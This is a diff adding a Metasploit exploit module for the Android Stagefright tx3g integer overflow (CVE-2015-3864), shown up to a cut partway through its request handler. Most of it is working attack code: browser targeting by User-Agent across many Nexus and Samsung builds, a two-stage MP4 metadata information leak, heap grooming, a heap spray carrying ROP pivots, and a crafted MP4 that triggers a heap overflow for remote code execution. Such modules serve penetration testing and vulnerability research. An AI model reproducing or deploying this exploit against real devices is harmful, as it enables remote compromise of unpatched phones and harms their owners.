@@ -1,0 +1,1212 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpServer::HTML
+  include Msf::Exploit::RopDb
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Android Stagefright MP4 tx3g Integer Overflow",
+      'Description'    => %q{
+          This module exploits a integer overflow vulnerability in the Stagefright
+        Library (libstagefright.so). The vulnerability occurs when parsing specially
+        crafted MP4 files. While a wide variety of remote attack vectors exist, this
+        particular exploit is designed to work within an HTML5 compliant browser.
+
+          Exploitation is done by supplying a specially crafted MP4 file with two
+        tx3g atoms that, when their sizes are summed, cause an integer overflow when
+        processing the second atom. As a result, a temporary buffer is allocated
+        with insufficient size and a memcpy call leads to a heap overflow.
+
+          This version of the exploit uses a two-stage information leak based on
+        corrupting the MetaData that the browser reads from mediaserver. This method
+        is based on a technique published in NorthBit's Metaphor paper. First,
+        we use a variant of their technique to read the address of a heap buffer
+        located adjacent to a SampleIterator object as the video HTML element's
+        videoHeight. Next, we read the vtable pointer from an empty Vector within
+        the SampleIterator object using the video element's duration. This gives
+        us a code address that we can use to determine the base address of
+        libstagefright and construct a ROP chain dynamically.
+
+        NOTE: the mediaserver process on many Android devices (Nexus, for example) is
+        constrained by SELinux and thus cannot use the execve system call. To avoid
+        this problem, the original exploit uses a kernel exploit payload that disables
+        SELinux and spawns a shell as root. Work is underway to make the framework
+        more amenable to these types of situations. Until that work is complete, this
+        exploit will only yield a shell on devices without SELinux or with SELinux in
+        permissive mode.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          # Exodus/jordan # initial discovery / disclosure
+          'jduck',     # Metasploit module, further infoleak development
+          'NorthBit'   # intiial information leak implementation
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2015-3864' ],
+          [ 'URL', 'https://blog.exodusintel.com/2015/08/13/stagefright-mission-accomplished/' ],
+          [ 'URL', 'http://googleprojectzero.blogspot.com/2015/09/stagefrightened.html' ],
+          [ 'URL', 'https://raw.githubusercontent.com/NorthBit/Public/master/NorthBit-Metaphor.pdf' ],
+          [ 'URL', 'https://github.com/NorthBit/Metaphor' ],
+          # Not used, but related
+          [ 'URL', 'http://drops.wooyun.org/papers/7558' ],
+          [ 'URL', 'http://translate.wooyun.io/2015/08/08/Stagefright-Vulnerability-Disclosure.html' ],
+          [ 'URL', 'https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/2016/01/libstagefright-exploit-notespdf/' ],
+        ],
+      'Payload'        =>
+        {
+          'Space'    => 2048,
+          'DisableNops' => true,
+        },
+      #'DefaultOptions' => { 'PAYLOAD' => 'linux/armle/mettle/reverse_tcp' },
+      'Platform'       => 'linux',
+      'Arch'           => [ARCH_ARMLE], # TODO: , ARCH_X86, ARCH_X86_64, ARCH_MIPSLE],
+      'Targets'        =>
+        [
+          [ 'Automatic', {} ],
+          #
+          # Each target includes information about the device, firmware, and
+          # how exactly to about exploiting it.
+          #
+          # Primarily, these targets are used to map a browser's User-Agent to
+          # exploit specifics for that device / build.
+          #
+          [
+            'Nexus 7 (Wi-Fi) (razor) with Android 5.0 (LRX21P)',
+            {
+              'Model' => 'Nexus 7',
+              'Build' => 'LRX21P',
+              'Release' => '5.0',
+              'Rop' => 'lrx',
+              'SprayAddress' => 0xb1508000
+            }
+          ],
+          [
+            'Nexus 7 (Wi-Fi) (razor) with Android 5.0.1 (LRX22C)',
+            {
+              'Model' => 'Nexus 7',
+              'Build' => 'LRX22C',
+              'Release' => '5.0.1',
+              'Rop' => 'lrx'
+            }
+          ],
+          [
+            'Nexus 7 (Wi-Fi) (razor) with Android 5.0.2 (LRX22G)',
+            {
+              'Model' => 'Nexus 7',
+              'Build' => 'LRX22G',
+              'Release' => '5.0.2',
+              'Rop' => 'lrx'
+            }
+          ],
+          [
+            'Nexus 7 (Wi-Fi) (razor) with Android 5.1 (LMY47O)',
+            {
+              'Model' => 'Nexus 7',
+              'Build' => 'LMY47O',
+              'Release' => '5.1',
+              'Rop' => 'lmy-1'
+            }
+          ],
+          [
+            'Nexus 7 (Wi-Fi) (razor) with Android 5.1.1 (LMY47V)',
+            {
+              'Model' => 'Nexus 7',
+              'Build' => 'LMY47V',
+              'Release' => '5.1.1',
+              'Rop' => 'lmy-1'
+            }
+          ],
+          [
+            'Nexus 7 (Wi-Fi) (razor) with Android 5.1.1 (LMY48G)',
+            {
+              'Model' => 'Nexus 7',
+              'Build' => 'LMY48G',
+              'Release' => '5.1.1',
+              'Rop' => 'lmy-1'
+            }
+          ],
+          [
+            'Nexus 7 (Wi-Fi) (razor) with Android 5.1.1 (LMY48I)',
+            {
+              'Model' => 'Nexus 7',
+              'Build' => 'LMY48I',
+              'Release' => '5.1.1',
+              'Rop' => 'lmy-2'
+            }
+          ],
+          [
+            'Nexus 7 (Mobile) (razorg) with Android 5.0.2 (LRX22G)',
+            {
+              'Model' => 'Nexus 7',
+              'Build' => 'LRX22G',
+              'Release' => '5.0.2',
+              'Rop' => 'lrx'
+            }
+          ],
+          [
+            'Nexus 7 (Mobile) (razorg) with Android 5.1 (LMY47O)',
+            {
+              'Model' => 'Nexus 7',
+              'Build' => 'LMY47O',
+              'Release' => '5.1',
+              'Rop' => 'lmy-1'
+            }
+          ],
+          [
+            'Nexus 7 (Mobile) (razorg) with Android 5.1.1 (LMY47V)',
+            {
+              'Model' => 'Nexus 7',
+              'Build' => 'LMY47V',
+              'Release' => '5.1.1',
+              'Rop' => 'lmy-1'
+            }
+          ],
+          [
+            'Nexus 5 (hammerhead) with Android 5.0 (LRX21O)',
+            {
+              'Model' => 'Nexus 5',
+              'Build' => 'LRX21O',
+              'Release' => '5.0',
+              'Rop' => 'lrx'
+            }
+          ],
+          [
+            'Nexus 5 (hammerhead) with Android 5.0.1 (LRX22C)',
+            {
+              'Model' => 'Nexus 5',
+              'Build' => 'LRX22C',
+              'Release' => '5.0.1',
+              'Rop' => 'lrx'
+            }
+          ],
+          [
+            'Nexus 5 (hammerhead) with Android 5.1 (LMY47D)',
+            {
+              'Model' => 'Nexus 5',
+              'Build' => 'LMY47D',
+              'Release' => '5.1',
+              'Rop' => 'lmy-1'
+            }
+          ],
+          [
+            'Nexus 5 (hammerhead) with Android 5.1 (LMY47I)',
+            {
+              'Model' => 'Nexus 5',
+              'Build' => 'LMY47I',
+              'Release' => '5.1',
+              'Rop' => 'lmy-1'
+            }
+          ],
+          [
+            'Nexus 5 (hammerhead) with Android 5.1.1 (LMY48B)',
+            {
+              'Model' => 'Nexus 5',
+              'Build' => 'LMY48B',
+              'Release' => '5.1.1',
+              'Rop' => 'lmy-1'
+            }
+          ],
+          [
+            'Nexus 5 (hammerhead) with Android 5.1.1 (LMY48I)',
+            {
+              'Model' => 'Nexus 5',
+              'Build' => 'LMY48I',
+              'Release' => '5.1.1',
+              'Rop' => 'lmy-2'
+            }
+          ],
+          [
+            'Nexus 6 (shamu) with Android 5.0 (LRX21O)',
+            {
+              'Model' => 'Nexus 6',
+              'Build' => 'LRX21O',
+              'Release' => '5.0',
+              'Rop' => 'lrx'
+            }
+          ],
+          [
+            'Nexus 6 (shamu) with Android 5.0.1 (LRX22C)',
+            {
+              'Model' => 'Nexus 6',
+              'Build' => 'LRX22C',
+              'Release' => '5.0.1',
+              'Rop' => 'lrx'
+            }
+          ],
+          [
+            'Nexus 6 (shamu) with Android 5.1 (LMY47D)',
+            {
+              'Model' => 'Nexus 6',
+              'Build' => 'LMY47D',
+              'Release' => '5.1',
+              'Rop' => 'lmy-1'
+            }
+          ],
+          [
+            'Nexus 6 (shamu) with Android 5.1 (LMY47E)',
+            {
+              'Model' => 'Nexus 6',
+              'Build' => 'LMY47E',
+              'Release' => '5.1',
+              'Rop' => 'lmy-1'
+            }
+          ],
+          [
+            'Nexus 6 (shamu) with Android 5.1 (LMY47I)',
+            {
+              'Model' => 'Nexus 6',
+              'Build' => 'LMY47I',
+              'Release' => '5.1',
+              'Rop' => 'lmy-1'
+            }
+          ],
+          [
+            'Nexus 6 (shamu) with Android 5.1.1 (LYZ28E)',
+            {
+              'Model' => 'Nexus 6',
+              'Build' => 'LYZ28E',
+              'Release' => '5.1.1',
+              'Rop' => 'shamu / LYZ28E'
+            }
+          ],
+          [
+            'Nexus 6 (shamu) with Android 5.1 (LMY47M)',
+            {
+              'Model' => 'Nexus 6',
+              'Build' => 'LMY47M',
+              'Release' => '5.1',
+              'Rop' => 'lmy-1'
+            }
+          ],
+          [
+            'Nexus 6 (shamu) with Android 5.1.1 (LMY47Z)',
+            {
+              'Model' => 'Nexus 6',
+              'Build' => 'LMY47Z',
+              'Release' => '5.1.1',
+              'Rop' => 'lmy-1'
+            }
+          ],
+          [
+            'Nexus 6 (shamu) with Android 5.1.1 (LVY48C)',
+            {
+              'Model' => 'Nexus 6',
+              'Build' => 'LVY48C',
+              'Release' => '5.1.1',
+              'Rop' => 'lmy-1'
+            }
+          ],
+          [
+            'Nexus 6 (shamu) with Android 5.1.1 (LMY48I)',
+            {
+              'Model' => 'Nexus 6',
+              'Build' => 'LMY48I',
+              'Release' => '5.1.1',
+              'Rop' => 'lmy-2'
+            }
+          ],
+          [
+            'Nexus 6 (shamu) with Android 5.1.1 (LYZ28J)',
+            {
+              'Model' => 'Nexus 6',
+              'Build' => 'LYZ28J',
+              'Release' => '5.1.1',
+              'Rop' => 'shamu / LYZ28J'
+            }
+          ],
+          [
+            'Nexus 6 (shamu) with Android 5.1.1 (LVY48E)',
+            {
+              'Model' => 'Nexus 6',
+              'Build' => 'LVY48E',
+              'Release' => '5.1.1',
+              'Rop' => 'lmy-2'
+            }
+          ],
+          [
+            'Samsung Galaxy S5 (VZW SM-G900V) with Android 5.0 (LRX21T)',
+            {
+              'Model' => 'SM-G900V',
+              'Build' => 'LRX21T',
+              'Release' => '5.0',
+              'Rop' => 'sm-g900v / OE1',
+              'SprayAddress' => 0xaf008000,
+              'SampleIteratorSize' => 0xa8,
+              'VectorSize' => 0xec
+            }
+          ]
+        ],
+      'Privileged'     => true,
+      'DisclosureDate' => "Aug 13 2015",
+      'DefaultTarget'  => 0))
+
+=begin
+    register_options(
+      [
+        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
+      ], self.class)
+=end
+  end
+
+  def exploit
+    @peers = {}
+    super
+  end
+
+  def get_target(request)
+    agent = request.headers['User-Agent']
+    self.targets.each do |t|
+      next if t.name == 'Automatic'
+      regexp = Regexp.escape("Linux; Android #{t['Release']}; #{t['Model']} Build/#{t['Build']}")
+      return t if (agent =~ /#{regexp}/)
+    end
+    return nil
+  end
+
+  #
+  # Construct a page worth of data that we'll spray
+  #
+  # NOTE: The data within is target-specific
+  #
+  def build_spray(my_target, peer, spray_addr)
+    # Initialize the page to a reasonable state.
+    page = ''
+    page = rand_text(4096)
+
+    # Load target-based exploit-specific variables
+    details = get_details(my_target)
+    return nil if details.nil?
+
+    # Calculate the libstagefright.so base address
+    vector_rva = details['VectorRVA']
+    vector_ptr = peer[:vector_vtable_addr]
+    libsf_base = (vector_ptr & 0xfffff000) - (vector_rva & 0xfffff000)
+
+    # If we smash mDataSource, this ends up controlling the program counter!!
+=begin
+    0xb65fd7c4 <parseChunk(long long*, int)+4596>:      ldr     r2, [r0, #0]
+    0xb65fd7c6 <parseChunk(long long*, int)+4598>:      str     r1, [sp, #0]
+    0xb65fd7c8 <parseChunk(long long*, int)+4600>:      ldr     r5, [r7, #0]
+    0xb65fd7ca <parseChunk(long long*, int)+4602>:      str     r5, [sp, #4]
+    0xb65fd7cc <parseChunk(long long*, int)+4604>:      ldr     r6, [r2, #28]
+    0xb65fd7ce <parseChunk(long long*, int)+4606>:      ldrd    r2, r3, [r10]
+    0xb65fd7d2 <parseChunk(long long*, int)+4610>:      blx     r6
+    0xb65fd7d4 <parseChunk(long long*, int)+4612>:      ldrd    r2, r3, [sp, #64]       ; 0x40
+=end
+
+    # Initialize our pivot values and adjust them to libstagefright's base.
+    # First, load r0 (pointer to our buffer) into some register..
+    mds_pivot1 = libsf_base + details['Pivot1']
+
+    # Next, load sp (and probably other stuff) from there
+    mds_pivot2 = libsf_base + details['Pivot2']
+
+    # Finally, skip over some stuff and kick of the ROP chain
+    mds_adjust = libsf_base + details['Adjust']
+
+    # The offset to the ROP change beginning
+    rop_start_off = 0x30
+
+    # Point sp to the remainder of the ROP chain
+    new_sp = spray_addr + rop_start_off
+
+    # Sometimes the spray isn't aligned perfectly, this fixes that situation...
+    unalign_off = 0x998
+    new_sp2 = new_sp + 0x1000 - unalign_off
+
+    # This pointer should point to the beginning of the shellcode payload
+    payload_ptr = spray_addr + 0xa0
+
+    # Put the stack back!
+    stack_fix = "\x0a\xd0\xa0\xe1"  # mov sp, r10 ; restore original sp
+
+    # Depending on the pivot strategy in use, we have to set things up slightly
+    # differently...
+    #
+    # In each case, we use a two-stage pivot that reads the spray address from
+    # r0 (we smashed that, remember).
+    #
+    # The addroffs array is used to map values to the offsets where the pivots
+    # expect them to be.
+    #
+    case details['PivotStrategy']
+    when 'lrx'
+      addroffs = [
+        [ 0x0, new_sp ],
+        [ 0x10, mds_pivot2 ],
+        [ 0x1c, mds_pivot1 ],
+      ]
+
+      # Since we are only popping one item in pivot2, we reduce the rop_start_off
+      rop_start_off -= 4
+
+      # Adjust the payload pointer
+      payload_ptr -= 4
+
+    when 'lmy-1'
+      addroffs = [
+        [ 0x8, new_sp ],
+        [ 0xc, mds_adjust ],
+        [ 0x10, mds_pivot2 ],
+        [ 0x1c, mds_pivot1 ]
+      ]
+
+    when 'lmy-2'
+      ptr_to_mds_pivot2 = spray_addr + 0x10 - 0x18  # adjust for displacement
+      addroffs = [
+        [ 0x0, ptr_to_mds_pivot2 ],
+        [ 0x8, new_sp ],
+        [ 0xc, mds_adjust ],
+        [ 0x10, mds_pivot2 ],
+        [ 0x1c, mds_pivot1 ]
+      ]
+
+      stack_fix = "\x09\xd0\xa0\xe1"  # mov sp, r9 ; restore original sp
+
+    when 'lyz'
+      ptr_to_mds_pivot2 = spray_addr + 0x8
+      addroffs = [
+        [ 0x0, ptr_to_mds_pivot2 ],
+        [ 0x8, mds_pivot2 ],
+        [ 0x1c, mds_pivot1 ],
+        [ 0x24, new_sp ],
+        # lr is at 0x28!
+        [ 0x2c, mds_adjust ]
+      ]
+
+      # We can't fix it becuse we don't know where the original stack is anymore :-/
+      stack_fix = ""
+
+    when 'sm-g900v'
+      addroffs = [
+        [ 0x4, mds_adjust ],
+        [ 0x10, new_sp ],
+        [ 0x1c, mds_pivot1 ],
+        [ 0x20, mds_pivot2 ]
+      ]
+
+    else
+      print_error("ERROR: PivotStrategy #{details['PivotStrategy']} is not implemented yet!")
+      return nil
+    end
+
+    # We need our ROP to build the page... Create it.
+    rop = generate_rop_payload('stagefright', stack_fix + payload.encoded, {'base' => libsf_base, 'target' => my_target['Rop'] })
+
+    # Fix up the payload pointer in the ROP
+    idx = rop.index([ 0xc600613c ].pack('V'))
+    rop[idx, 4] = [ payload_ptr ].pack('V')
+
+    # Insert the ROP
+    page[rop_start_off, rop.length] = rop
+
+    # Insert the special values...
+    addroffs.each do |ao|
+      off,addr = ao
+      page[off,4] = [ addr ].pack('V')
+
+      # Sometimes the spray isn't aligned perfectly...
+      if addr == new_sp
+        page[off+unalign_off,4] = [ new_sp2 ].pack('V')
+      else
+        page[off+unalign_off,4] = [ addr ].pack('V')
+      end
+    end
+
+    page
+  end
+
+  #
+  # MPEG-4 specific functionality
+  #
+  def get_atom(tag, data='', length=nil)
+    if tag.length != 4
+        raise 'Yo! They call it "FourCC" for a reason.'
+    end
+
+    length ||= data.length + 8
+    if length >= 2**32
+      return [ [ 1 ].pack('N'), tag, [ length ].pack('Q>'), data ].join
+    end
+    [ [ length ].pack('N'), tag, data ].join
+  end
+
+  def get_stsc(num)
+    stsc_data = [ 0, num ].pack('N*')  # version/flags, mNumSampleToChunkOffsets
+    stsc_data << [ 13+1, 0x5a5a5a5a, 37 ].pack('N*') * num
+    get_atom('stsc', stsc_data)
+  end
+
+  def get_ftyp
+    # Build the MP4 header...
+    ftyp = 'mp42'
+    ftyp << [ 0 ].pack('N')
+    ftyp << 'mp42'
+    ftyp << 'isom'
+    get_atom('ftyp', ftyp)
+  end
+
+  def get_pssh(alloc_size)
+    pssh_data = ''
+    pssh_data << [ 0 ].pack('N')
+    pssh_data << [ 0, 0, 0, 0 ].pack('N*')
+    pssh_data << [ alloc_size ].pack('N')
+    alloc_size.times do |off|
+      pssh_data << [ 0x55aa0000 + off ] .pack('V')
+    end
+    get_atom('pssh', pssh_data)
+  end
+
+  def get_metaitem(tag, type, data)
+    ret = ''
+    ret << tag.reverse
+    ret << type.reverse
+    case type
+    when 'in32'
+      ret << [ 4, data ].pack('V*')
+    when 'in64'
+      ret << [ 8, data ].pack('V*')
+    else
+      raise "How do you expect me to make a #{type.inspect} ??"
+    end
+    ret
+  end
+
+  def jemalloc_round(sz)
+    # These are in the 16-byte aligned runs
+    if (sz > 0x10 && sz <= 0x80)
+      round = 16
+    # 160 starts the 32-byte aligned runs
+    elsif (sz > 0x80 && sz <= 0x140)
+      round = 32
+    else
+      raise "Don't know how to round 0x%x" % sz
+    end
+    ret = (sz + (round - 1)) / round
+    ret *= round
+    return ret
+  end
+
+  #
+  # Leak data from mediaserver back to the browser!
+  #
+  # Stage 1 - leak a heap pointer near a SampleIterator object
+  # Stage 2 - read a code pointer from the SampleIterator object
+  #
+  def get_mp4_leak(my_target, peer)
+    # MPEG4 Fileformat Reference:
+    # http://qtra.apple.com/index.html
+    #
+    # Structure:
+    # [File type Chunk][Other Atom Chunks]
+    #
+    # Where [Chunk] == [Atom/Box Length][Atom/Box Type][Atom/Box Data]
+    #
+    sampiter_alloc_size = 0x78
+    sampiter_alloc_size = my_target['SampleIteratorSize'] if not my_target['SampleIteratorSize'].nil?
+    sampiter_rounded = jemalloc_round(sampiter_alloc_size)
+    vector_alloc_size = 0x8c
+    vector_alloc_size = my_target['VectorSize'] if not my_target['VectorSize'].nil?
+    groom_count = 0x10
+
+    is_samsung = (my_target['Rop'] == 'sm-g900v / OE1')
+
+    # Coerce the heap into a favorable shape (fill holes)
+    shape_vector = get_pssh(vector_alloc_size)
+
+    # Allocate a block of memory of the correct size
+    placeholder = get_atom('titl', ('t' * 4) + ('titl' * (vector_alloc_size / 4)) + [ 0 ].pack('C'))
+
+    # Make the first tx3g chunk, which is meant to overflow into a MetaData array.
+    # We account for the overhead of both chunks here and aim for this layout:
+    #
+    # placeholder after re-allocation                     | vector array data
+    # <len><tag><padding><is-64bit><tag><len hi><len low> | <overflow data>
+    #
+    # Realistically, tx3g1_padding can be any number that rounds up to the
+    # correct size class.
+    tx3g1_overhead = 0x8
+    tx3g2_overhead = 0x10
+    tx3g_target = jemalloc_round(vector_alloc_size)
+    tx3g1_padding = tx3g_target - (tx3g1_overhead + tx3g2_overhead)
+    tx3g_data = 'x' * tx3g1_padding
+    tx3g_1 = get_atom('tx3g', tx3g_data)
+
+    # NOTE: hvcC added in 3b5a6b9fa6c6825a1d0b441429e2bb365b259827 (5.0.0 and later only)
+    # avcC was in the initial commit.
+    near_sampiter = get_atom('hvcC', "C" * sampiter_alloc_size)
+
+    # Craft the data that will overwrite the header and part of the MetaData
+    # array...
+    more_data = ''
+    more_data << [ 9, vector_alloc_size - 0x10, 0, 0 ].pack('V*')
+
+    # Now add the thing(s) we want to control (partially)
+    #
+    # We add some BS entries just to kill the real 'heig' and get proper
+    # ordering...
+    near_sampiter_addr = peer[:near_sampiter_addr]
+    if near_sampiter_addr.nil?
+      # Part 1. Leak the address of a chunk that should be adjacent to a
+      # SampleIterator object.
+      if is_samsung
+        # On Samsung:
+        # Before: dmcE, dura, frmR, heig, hvcC, inpS, lang, mime, widt
+        # After:  dmcE, abc1, abc2, abc3, heig...
+        more_data << get_metaitem('dmcE', 'in32', 1)
+        more_data << get_metaitem('abc1', 'in32', 31335)
+        more_data << get_metaitem('abc2', 'in32', 31336)
+      end
+
+      # On Nexus:
+      # Before: heig, hvcc, inpS, mime, text, widt
+      # After:  abc3, heig...
+      more_data << get_metaitem('abc3', 'in32', 31337)
+
+      # NOTE: We only use the first 12 bytes so that we don't overwrite the
+      # pointer that is already there!
+      heig = get_metaitem('heig', 'in32', 31338)
+      more_data << heig[0,12]
+    else
+      # Part 2. Read from the specified address, as with the original Metaphor
+      # exploit.
+      if is_samsung
+        # On Samsung:
+        # Before: dmcE, dura, frmR, heig, hvcC, inpS, lang, mime, widt
+        # After:  dmcE, dura, ...
+        more_data << get_metaitem('dmcE', 'in32', 1)
+      else
+        # On Nexus:
+        # Before: avcc, heig, inpS, mime, text, widt
+        # After:  dura, ...
+        near_sampiter = get_atom('avcC', "C" * sampiter_alloc_size)
+      end
+
+      # Try to read the mCurrentChunkSampleSizes vtable ptr within a
+      # SampleIterator object. This only works because the Vector is empty thus
+      # passing the restrictions imposed by the duration conversion.
+      ptr_to_vector_vtable = near_sampiter_addr - (sampiter_rounded * 2) + 0x30
+      more_data << get_metaitem('dura', 'in64', ptr_to_vector_vtable)
+    end
+
+    # The tx3g2 then needs to trigger the integer overflow, but can contain any
+    # contents. The overflow will terminate at the end of the file.
+    #
+    # NOTE: The second tx3g chunk's overhead ends up in the slack space between
+    # the replaced placeholder and the MetaData Vector contents.
+    big_num = 0x1ffffffff - tx3g_1.length + 1 + vector_alloc_size
+    tx3g_2 = get_atom('tx3g', more_data, big_num)
+
+    # Create a minimal, verified 'trak' to satisfy mLastTrack being set
+    stbl_data = get_stsc(1)
+    stbl_data << get_atom('stco', [ 0, 0 ].pack('N*'))     # version, mNumChunkOffsets
+    stbl_data << get_atom('stsz', [ 0, 0, 0 ].pack('N*'))  # version, mDefaultSampleSize, mNumSampleSizes
+    stbl_data << get_atom('stts', [ 0, 0 ].pack('N*'))     # version, mTimeToSampleCount
+    stbl = get_atom('stbl', stbl_data)
+    verified_trak = get_atom('trak', stbl)
+
+    # Start putting it all together into a track.
+    trak_data = ''
+
+    if is_samsung
+      # Put some legitimate duration information so we know if we failed
+      mdhd_data = [ 0 ].pack('N')     # version
+      mdhd_data << "\x00" * 8         # padding
+      mdhd_data << [ 1 ].pack('N')    # timescale
+      mdhd_data << [ 314 ].pack('N')  # duration
+      mdhd_data << [ 0 ].pack('n')    # lang
+      trak_data << get_atom('mdhd', mdhd_data)
+    end
+
+    # Add this so that our file is identified as video/mp4
+    mp4v_data = ''
+    mp4v_data << [ 0 ].pack('C') * 24 # padding
+    mp4v_data << [ 1024 ].pack('n')   # width
+    mp4v_data << [ 768 ].pack('n')    # height
+    mp4v_data << [ 0 ].pack('C') * (78 - mp4v_data.length)  # padding
+    trak_data << get_atom('mp4v', mp4v_data)  # satisfy hasVideo = true
+
+    # Here, we cause allocations such that we can replace the placeholder...
+    if is_samsung
+      trak_data << placeholder   # Somethign we can free
+      trak_data << shape_vector  # Eat the loose block...
+      trak_data << stbl          # Cause the growth of the track->meta Vector
+    else
+      trak_data << stbl          # Cause the growth of the track->meta Vector
+      trak_data << placeholder   # Somethign we can free
+      trak_data << shape_vector  # Eat the loose block...
+    end
+
+    # Add the thing whose entry in the MetaData vector we want to overwrite...
+    trak_data << near_sampiter
+
+    # Get our overflow data into memory
+    trigger = ''
+    trigger << tx3g_1
+
+    # Free the place holder
+    trigger << get_atom('titl', ('t' * 4) + ('BBBB' * vector_alloc_size) + [ 0 ].pack('C'))
+
+    # Overflow the temporary buffer into the following MetaData array
+    trigger << tx3g_2
+
+    # !!! NOTE !!!
+    # On Samsung devices, the failure that causes ERR to be returned from
+    # 'tx3g' processing leads to "skipTrack" being set. This means our
+    # nasty track and it's metadata get deleted and not returned to the
+    # browser -- effectively killing the infoleak.
+    #
+    # However! It also handles "skipTrack" being set specially and does not
+    # immediately propagate the error to the caller. Instead, it returns OK.
+    # This allows us to triggering the bug multiple times in one file, or --
+    # as we have in this case -- survive after and return successfully.
+    if is_samsung
+      # Add this as a nested track!
+      trak_data << get_atom('trak', trigger)
+    else
+      trak_data << trigger
+    end
+    trak = get_atom('trak', trak_data)
+
+    # On Samsung devices, we could put more chunks here but they will
+    # end up smashing the temporary buffer further...
+
+    chunks = []
+    chunks << get_ftyp()
+    chunks << get_atom('moov')
+    chunks << verified_trak * 0x200
+    chunks << shape_vector * groom_count
+    chunks << trak
+
+    mp4 = chunks.join
+    mp4
+  end
+
+  def get_mp4_rce(my_target, peer)
+    # MPEG4 Fileformat Reference:
+    # http://qtra.apple.com/index.html
+    #
+    # Structure:
+    # [File type Chunk][Other Atom Chunks]
+    #
+    # Where [Chunk] == [Atom/Box Length][Atom/Box Type][Atom/Box Data]
+    #
+    chunks = []
+    chunks << get_ftyp()
+
+    # Note, this causes a few allocations
+    moov_data = ''
+    mvhd_data = [ 0, 0x41414141 ].pack('N*')
+    mvhd_data << 'B' * 0x5c
+    moov_data << get_atom('mvhd', mvhd_data)
+
+    # Add a minimal, verified 'trak' to satisfy mLastTrack being set
+    verified_trak = ''
+    stbl_data = get_stsc(0x28)
+    stbl_data << get_atom('stco', [ 0, 0 ].pack('N*'))     # version, mNumChunkOffsets
+    stbl_data << get_atom('stsz', [ 0, 0, 0 ].pack('N*'))  # version, mDefaultSampleSize, mNumSampleSizes
+    stbl_data << get_atom('stts', [ 0, 0 ].pack('N*'))     # version, mTimeToSampleCount
+    verified_trak << get_atom('trak', get_atom('stbl', stbl_data))
+
+    # Add it to the file
+    moov_data << verified_trak
+
+    # The spray_addr field is typically determined empirically (by testing), but
+    # has proven to be fairly predictable (99%). However, it does vary from
+    # one device to the next (probably determined by the pre-loaded libraries).
+    spray_addr = 0xb0c08000
+    spray_addr = my_target['SprayAddress'] if not my_target['SprayAddress'].nil?
+
+    # Construct a single page that we will spray
+    page = build_spray(my_target, peer, spray_addr)
+    return nil if page.nil?
+
+    # Build a big block full of spray pages and and put it in an avcC chunk
+    # (but don't add it to the 'moov' yet)
+    spray = page * (((16 * 1024 * 1024) / page.length) - 20)
+    avcc = get_atom('avcC', spray)
+
+    # Make the nasty trak
+    tkhd1 = ''
+    tkhd1 << [ 0 ].pack('C')  # version
+    tkhd1 << 'D' * 3          # padding
+    tkhd1 << 'E' * (5*4)      # {c,m}time, id, ??, duration
+    tkhd1 << 'F' * 0x10       # ??
+    tkhd1 << [
+      0x10000,  # a00
+      0,        # a01
+      0,        # dx
+      0,        # a10
+      0x10000,  # a11
+      0         # dy
+    ].pack('N*')
+    tkhd1 << 'G' * 0x14       # ??
+
+    # Add the tkhd (track header) to the nasty track
+    trak1 = ''
+    trak1 << get_atom('tkhd', tkhd1)
+
+    # Build and add the 'mdia' (Media information) to the nasty track
+    mdia1 = ''
+    mdhd1 = [ 0 ].pack('C')  # version
+    mdhd1 << 'D' * 0x17      # padding
+    mdia1 << get_atom('mdhd', mdhd1)
+    mdia1 << get_atom('hdlr', 'F' * 0x38)  # Media handler
+    dinf1 = ''
+    dinf1 << get_atom('dref', 'H' * 0x14)  # Data information box
+    minf1 = ''
+    minf1 << get_atom('smhd', 'G' * 0x08)
+    minf1 << get_atom('dinf', dinf1)
+    stbl1 = get_stsc(2)
+    minf1 << get_atom('stbl', stbl1)
+    mdia1 << get_atom('minf', minf1)
+    trak1 << get_atom('mdia', mdia1)
+
+    # Add something to take up a slot in the 0x20 size range
+    # NOTE: We have to be able to free this later...
+    block = 'Q' * 0x1c
+    trak1 << get_atom('covr', get_atom('data', [ 0, 0 ].pack('N*') + block))
+
+    # Add a Track (hopefully right after)
+    trak1 << verified_trak
+
+    # Add the avcC chunk with the heap spray. We add it here so it's sure to be
+    # allocated when we get control of the program counter...
+    trak1 << avcc
+
+    # Build the first of the nasty pair of tx3g chunks that trigger the
+    # vulnerability
+    alloc_size = 0x20
+    overflow_size = 0xc0
+
+    overflow = [ spray_addr ].pack('V') * (overflow_size / 4)
+    tx3g_1 = get_atom('tx3g', overflow)
+    trak1 << tx3g_1
+
+    # Free the original thing and put the tx3g temporary in it's place...
+    block = 'R' * 0x40
+    trak1 << get_atom('covr', get_atom('data', [ 0, 0 ].pack('N*') + block))
+
+    # Make the second one, which triggers the integer overflow
+    big_num = 0x1ffffffff - 8 - overflow.length + 1 + alloc_size
+    more_data = [ spray_addr ].pack('V') * (overflow_size / 4)
+    tx3g_2 = get_atom('tx3g', more_data, big_num)
+    trak1 << tx3g_2
+
+    # Add the nasty track to the moov data
+    moov_data << get_atom('trak', trak1)
+
+    # Finalize the moov chunk
+    moov = get_atom('moov', moov_data)
+    chunks << moov
+
+    # Combine outer chunks together and voila.
+    mp4 = chunks.join
+    mp4
+  end
+
+  def on_request_uri(cli, request)
+    # If the request is for an mp4 file, we need to get the target from the @peers hash
+    if request.uri =~ /\.mp4\?/i
+      mp4_fn = request.uri.split('/')[-1]
+      mp4_fn = mp4_fn.split('?')[0]
+      mp4_fn[-4,4] = ''
+
+      peer = @peers[mp4_fn]
+
+      my_target = nil
+      my_target = peer[:target] if peer
+      if my_target.nil?
+        send_not_found(cli)
+        print_error("#{cli.peerhost}:#{cli.peerport} - Requested #{request.uri} - Unknown peer")
+        return
+      end
+
+      # Extract the address(s) we just leaked...
+      sia_addr = request.qstring['sia'].to_i  # near_sampiter data address
+      peer[:near_sampiter_addr] = sia_addr if sia_addr > 0
+      sfv_addr = request.qstring['sfv'].to_i  # stagefright Vector<size_t> vtable ptr
+      peer[:vector_vtable_addr] = sfv_addr if sfv_addr > 0
+      # reset after a crash..
+      if sia_addr == 0 && sfv_addr == 0
+        peer[:near_sampiter_addr] = peer[:vector_vtable_addr] = nil
+      end
+
+      # Always use this header
